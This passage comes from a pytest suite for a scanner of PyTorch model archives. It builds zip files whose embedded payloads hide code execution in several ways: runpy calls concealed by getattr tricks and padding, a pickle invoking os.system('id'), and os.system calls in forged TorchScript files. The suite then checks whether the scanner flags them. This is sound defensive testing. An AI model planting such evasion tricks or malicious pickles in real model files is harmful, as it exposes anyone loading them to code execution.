        + b"field: setattr(rp, 'run_path', print) = None\nrp.run_path('payload.py')\n"
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("prefix_state", "tail_state"),
    [
        (
            b"import builtins\nread_member = builtins.getattr\nbuiltins.getattr = lambda *args: print\n",
            b"read_member(rp, 'run_path')('payload.py')\n",
        ),
        (
            b"import builtins\nread_member = builtins.getattr\nbuiltins.getattr = lambda *args: print\n",
            b"read_member \\\n (rp, 'run_path')('payload.py')\n",
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\nimport builtins\n"
            b"namespace_of = builtins.vars\nbuiltins.vars = lambda obj: {}\n",
            b"namespace_of(rp).update(run_path=original)\n((rp).run_path)('payload.py')\n",
        ),
    ],
)
def test_pytorch_zip_detects_saved_builtin_helper_runpy_action_across_padding(
    tmp_path: Path, prefix_state: bytes, tail_state: bytes
) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = b"\x00\xffimport runpy as rp\n" + prefix_state + padding + tail_state + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_pytorch_zip_detects_tail_framed_runpy_member_restore_with_prefix_context(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    filler = b"# filler\n" * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(b"# filler\n") + 1)
    payload = (
        b"\x00\xffimport runpy as rp\noriginal = rp.run_path\nrp.run_path = print\n"
        + filler
        + b"\x00\xffrp.run_path = original\n\x00\xff((rp).run_path)('payload.py')\n"
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_pytorch_zip_detects_deep_folded_framed_runpy_getattr_without_recursion(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    member_expression = b" + ".join([b"'run_'", *([b"''"] * 1_000), b"'path'"])
    payload = (
        b"\x00\xffimport runpy as rp\n"
        + padding
        + b"\x00\xffgetattr(rp, "
        + member_expression
        + b")('payload.py')\n"
        + padding
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_pytorch_zip_detects_deep_nested_inert_forwarding_suffix_without_recursion(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    nested_literal = b"[" * 1_200 + b"0" + b"]" * 1_200
    payload = (
        b"\x00\xffimport runpy as rp\n"
        + padding
        + b"runner = rp.run_path; "
        + nested_literal
        + b"\n(runner)('payload.py')\n"
        + padding
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize("frame", [b"", b"\x00\xff"])
def test_pytorch_zip_detects_late_runpy_call_after_unreachable_member_overwrite(tmp_path: Path, frame: bytes) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = (
        b"\x00\xffimport runpy as rp\n"
        + padding
        + frame
        + b"if False:\n    rp.__dict__.update(run_path=print)\n"
        + b"rp.run_path('payload.py')\n"
        + padding
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "shadow_state",
    [
        b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
        + b"dict = Safe\ndict.update(rp.__dict__, run_path=print)\n",
        b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
        + b"        pass\nbi.dict = Safe\nbuiltins.dict.update(rp.__dict__, run_path=print)\n",
    ],
)
def test_pytorch_zip_ignores_shadowed_dict_update_before_dangerous_runpy_call(
    tmp_path: Path, shadow_state: bytes
) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = b"\x00\xffimport runpy as rp\n" + padding + shadow_state + b"((rp).run_path)('payload.py')\n" + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "call_line",
    [b"getattr(rp, 'run_path')('safe')\n", b"getattr(\n    rp, 'run_path'\n)('safe')\n"],
)
def test_pytorch_zip_ignores_shadowed_getattr_execution_endpoint(tmp_path: Path, call_line: bytes) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = b"\x00\xffimport runpy as rp\n" + padding + b"getattr = lambda obj, name: print\n" + call_line + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_pytorch_zip_preserves_forwarded_late_runpy_class_shadow(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    padding_line = b"# pad\n"
    padding = padding_line * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8)
    payload = (
        b"\x00\xffimport runpy as rp\n"
        + padding
        + b"runner = rp.run_path\nclass runner:\n    pass\nforward = runner\n(forward)('safe')\n"
        + padding
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_pytorch_zip_scans_parenthesized_runpy_alias_across_retained_boundary(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    leading_blocks = b"".join(
        f"def benign_{index}():\n    return {index}\n}}\x00".encode()
        for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
    )
    import_line = b"from runpy import run_path as runner\n"
    boundary_padding_length = (
        jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES - len(import_line) - len(b"(\n")
    )
    boundary_padding = b"#" + b"x" * (boundary_padding_length - 2) + b"\n"
    trailing_padding = b"# pad\n" * (
        jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8
    )
    payload = (
        b"\x00\xff"
        + leading_blocks
        + import_line
        + boundary_padding
        + b"(\n runner\n)('payload.py')\n"
        + trailing_padding
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        and "Dynamic module execution detected" in check.message
        for check in result.checks
    )


def test_pytorch_zip_scans_webbrowser_and_ctypes_execution_in_archive_data(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    payload = (
        b"\x00\xffdef payload():\n"
        b"    import ctypes\n"
        b"    import webbrowser\n"
        b"    webbrowser.get().open.__call__('https://example.invalid')\n"
        b"    webbrowser.get().__getattribute__('open')('https://example.invalid')\n"
        b"    ctypes.windll.kernel32\n"
        b"    ctypes.cdll['msvcrt'].printf(b'x')\n"
        b"    ctypes.cdll.__getitem__('msvcrt')\n"
        b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        b"    return loader.msvcrt.printf(b'x')\n"
        b"\x00MODEL-FRAMING"
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    matching_failures = [
        check
        for check in result.checks
        if check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
    ]
    assert any(
        check.rule_code == "S109" and "Web browser launch detected" in check.message for check in matching_failures
    )
    assert any(
        check.rule_code == "S110" and "Native library loading detected" in check.message for check in matching_failures
    )


def test_pytorch_zip_ignores_certain_replaced_runpy_execution_in_archive_data(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    payload = b"\x00\xffimport runpy\nrunpy.run_path = len\nrunpy.run_path([])\n\x00MODEL-FRAMING"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and "Dynamic module execution detected" in check.message
        for check in result.checks
    )


def test_pytorch_zip_ignores_framed_runpy_call_inside_multiline_literal(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    payload = b"\x00\xffimport runpy as rp\npayload = '''\n\x00\xff((rp).run_path)('safe')\n'''\n"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_pytorch_zip_ignores_string_literal_asyncio_subprocess_launch_with_unrelated_risk(
    tmp_path: Path,
) -> None:
    zip_path = tmp_path / "model.pt"
    payload = (
        b"import pickle\n\n"
        b"def payload(data):\n"
        b"    pickle.loads(data)\n"
        b"    return \"asyncio.create_subprocess_shell('id')\"\n"
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and "Subprocess execution detected" in check.message
        for check in result.checks
    )


@pytest.mark.parametrize(
    "payload",
    [
        (
            b"import os\n"
            b"import subprocess\n\n"
            b"def payload(args):\n"
            b"    marker = os.posix_spawn\n"
            b"    return subprocess.list2cmdline(args)\n"
        ),
        (
            b"import os\n"
            b"import subprocess\n\n"
            b"def payload():\n"
            b"    marker = os.posix_spawn\n"
            b"    return subprocess.run(['echo', 'ok'], check=False)\n"
        ),
    ],
)
def test_pytorch_zip_ignores_uninvoked_os_process_reference_with_unrelated_risk(tmp_path: Path, payload: bytes) -> None:
    zip_path = tmp_path / "model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and "OS command execution detected" in check.message
        for check in result.checks
    )


def test_pytorch_zip_ignores_non_source_eval_text_in_archive_data(tmp_path: Path) -> None:
    """Plain payload text containing a dangerous substring must not become a JIT false positive."""
    zip_path = tmp_path / "model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"note": "eval("}))

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_pytorch_zip_allows_torchscript_generated_python_files(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "scripted.pt", prefix="archive")
    debug_pkl = b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00."
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            "archive/code/__torch__.py",
            "\n".join(
                [
                    "class Module(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  training : bool",
                    "  def forward(self: __torch__.Module,",
                    "    x: Tensor) -> Tensor:",
                    "    return torch.relu(x)",
                    "",
                ]
            ),
        )
        zip_file.writestr("archive/code/__torch__.py.debug_pkl", debug_pkl)
        zip_file.writestr(
            "archive/code/__torch__/torch/nn/modules/container.py",
            "\n".join(
                [
                    "class Sequential(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  training : bool",
                    "  def forward(self: __torch__.torch.nn.modules.container.Sequential,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr("archive/code/__torch__/torch/nn/modules/container.py.debug_pkl", debug_pkl)

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    python_successes = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.PASSED
    ]
    assert python_failures == []
    assert len(python_successes) == 1
    assert python_successes[0].message == "No unexpected Python code files found in model"
    assert not [
        issue
        for issue in result.issues
        if issue.location
        and "archive/code/__torch__" in issue.location
        and issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]


def test_pytorch_zip_hf_google_bert_rust_model_torchscript_reconstruction_control(tmp_path: Path) -> None:
    model_path = tmp_path / "rust_model.ot"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", _torchscript_module_build_intlist_payload())
        _write_torchscript_generated_module(zip_file)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is False
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert not any(check.severity == IssueSeverity.CRITICAL for check in result.checks)
    assert any(
        set(issue.details.get("import_analysis", {}).get("found_imports", ()))
        >= {
            "__torch__.Module",
            "torch.jit._pickle.build_intlist",
        }
        for issue in result.issues
    )
    assert any(
        issue.details.get("associated_global") == "__torch__.Module"
        and str(issue.location).startswith(f"{model_path}:archive/data.pkl")
        for issue in result.issues
    )
    assert any(
        issue.details.get("associated_global") == "torch.jit._pickle.build_intlist"
        and str(issue.location).startswith(f"{model_path}:archive/data.pkl")
        for issue in result.issues
    )
    assert not any(
        check.name == "Python Code File Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("file") == "archive/code/__torch__.py"
        for check in result.checks
    ), f"{_HF_TORCHSCRIPT_QA_REPO_ID}@{_HF_TORCHSCRIPT_QA_REVISION}"


def test_pytorch_zip_hf_sentence_transformers_rust_model_classifies_members_independently(
    tmp_path: Path,
) -> None:
    model_path = tmp_path / "rust_model.ot"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", _torchscript_module_build_intlist_payload())
        zip_file.writestr("archive/constants.pkl", pickle.dumps({"constants": ()}, protocol=4))
        _write_torchscript_generated_module(zip_file)

    result = PyTorchZipScanner().scan(str(model_path))

    checks_by_member = _weights_only_analysis_checks_by_member(result)
    assert {
        "archive/data.pkl",
        "archive/constants.pkl",
        "archive/code/__torch__.py.debug_pkl",
    }.issubset(checks_by_member), f"{_HF_TORCHSCRIPT_ST_QA_REPO_ID}@{_HF_TORCHSCRIPT_ST_QA_REVISION}"
    data_check = checks_by_member["archive/data.pkl"]
    constants_check = checks_by_member["archive/constants.pkl"]
    debug_check = checks_by_member["archive/code/__torch__.py.debug_pkl"]

    assert data_check.status == CheckStatus.FAILED
    assert data_check.severity == IssueSeverity.WARNING
    assert data_check.details["nested_execution_opcode_evidence"] is False
    assert data_check.details["opcode_counts"] == {"GLOBAL": 2, "NEWOBJ": 1, "REDUCE": 1, "BUILD": 1}
    assert constants_check.status == CheckStatus.PASSED
    assert constants_check.details["dangerous_opcodes_found"] is False
    assert debug_check.status == CheckStatus.PASSED
    assert debug_check.details["dangerous_opcodes_found"] is False

    outcomes = {record["pickle_filename"]: record for record in result.metadata["pickle_member_outcomes"]}
    assert outcomes["archive/data.pkl"]["max_severity"] == "warning"
    assert outcomes["archive/constants.pkl"]["pickle_verdict"] == "clean"
    assert outcomes["archive/code/__torch__.py.debug_pkl"]["pickle_verdict"] == "clean"
    assert result.metadata["pickle_member_worst_outcome"]["pickle_filename"] == "archive/data.pkl"
    assert result.metadata["pickle_member_worst_outcome"]["max_severity"] == "warning"
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_pytorch_zip_torchscript_member_does_not_mask_critical_sidecar_pickle(tmp_path: Path) -> None:
    model_path = tmp_path / "rust_model_with_sidecar.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", _torchscript_module_build_intlist_payload())
        zip_file.writestr("archive/evil.pkl", b"\x80\x04cos\nsystem\n\x8c\x02id\x85R.")
        _write_torchscript_generated_module(zip_file)

    result = PyTorchZipScanner().scan(str(model_path))

    checks_by_member = _weights_only_analysis_checks_by_member(result)
    data_check = checks_by_member["archive/data.pkl"]
    evil_check = checks_by_member["archive/evil.pkl"]
    assert data_check.severity == IssueSeverity.WARNING
    assert evil_check.status == CheckStatus.FAILED
    assert evil_check.severity == IssueSeverity.CRITICAL
    assert evil_check.details["opcode_counts"] == {"REDUCE": 1}
    assert evil_check.details["assessment"] == "malicious"
    assert evil_check.details["import_analysis"]["found_malicious"] == ["os.system"]

    assert result.has_errors is True
    assert result.metadata["pickle_member_worst_outcome"]["pickle_filename"] == "archive/evil.pkl"
    assert result.metadata["pickle_member_worst_outcome"]["max_severity"] == "critical"
    assert result.metadata["pickle_member_worst_outcome"]["pickle_verdict"] == "malicious"
    assert any(
        issue.location == f"{model_path}:archive/evil.pkl"
        and issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("import_analysis", {}).get("found_malicious") == ["os.system"]
        for issue in result.issues
    )


def test_pytorch_zip_requires_exact_case_torchscript_debug_pair(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "scripted_case_mismatch.pt", prefix="archive")
    source_path = "archive/code/__torch__/PAYLOAD.py"
    debug_pkl = b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00."
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr("archive/code/__torch__/payload.py.debug_pkl", debug_pkl)

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert any(
        issue.location == f"{model_path}:{source_path}" and issue.severity == IssueSeverity.WARNING
        for issue in result.issues
    )


def test_pytorch_zip_requires_exact_case_torchscript_tree(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "scripted_tree_case_mismatch.pt", prefix="archive")
    source_path = "archive/code/__TORCH__/payload.py"
    debug_pkl = b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00."
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr("archive/code/__TORCH__/payload.py.debug_pkl", debug_pkl)

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert any(
        issue.location == f"{model_path}:{source_path}" and issue.severity == IssueSeverity.WARNING
        for issue in result.issues
    )


def test_pytorch_zip_does_not_allow_nested_torchscript_generated_python_files(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "nested_scripted.pt", prefix="archive")
    nested_path = "archive/data/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(nested_path, "class Payload:\n    pass\n")

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    failed_files = {check.details["file"] for check in python_failures}

    assert nested_path in failed_files
    assert any(
        issue.location == f"{model_path}:{nested_path}" and issue.severity == IssueSeverity.WARNING
        for issue in result.issues
    )


def test_pytorch_zip_still_warns_on_unexpected_python_files(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/code/helper.py", "print('not generated TorchScript source')\n")
        zip_file.writestr("archive/data/malicious.py", "import os\nos.system('id')\n")

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    failed_files = {check.details["file"] for check in python_failures}
    assert {"archive/code/helper.py", "archive/data/malicious.py"}.issubset(failed_files)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_unpaired_python_under_torchscript_tree(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/code/__torch__/payload.py", "import os\nos.system('id')\n")

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == "archive/code/__torch__/payload.py" for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_forged_torchscript_debug_pair(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            "archive/code/__torch__/payload.py",
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return __import__('os').system('id')",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == "archive/code/__torch__/payload.py" for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_builtins_indirection(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return __globals__['__builtins__']['__import__']('os').system('id')",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_markers_only_in_comments(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  # __parameters__ = []",
                    "  # __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_breakpoint_body_call(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return breakpoint()",
                    "",
                ]
            ),
        )
        zip_file.writestr(
